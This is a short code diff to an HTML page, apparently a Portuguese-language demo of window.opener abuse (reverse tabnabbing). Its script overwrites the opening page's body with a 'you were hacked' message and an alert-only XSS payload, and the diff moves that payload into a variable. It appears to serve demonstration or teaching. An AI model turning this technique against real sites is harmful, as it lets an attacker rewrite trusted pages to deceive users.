@@ -4,8 +4,13 @@
     <h1>Você caiu</h1>
     <script>
       try {
-        // altera
-        window.opener.document.body.innerHTML = `<h1>Você foi invadido!</h1><script>alert('XSS via window.opener')</script>`;
+        const payload = `
+          <h1>Você foi invadido!</h1>
+          <script>
+            alert('XSS via window.opener');
+          <\/script>
+        `;
+        window.opener.document.body.innerHTML = payload;
       } catch (e) {
         alert("Falha ao acessar opener: " + e);
       }
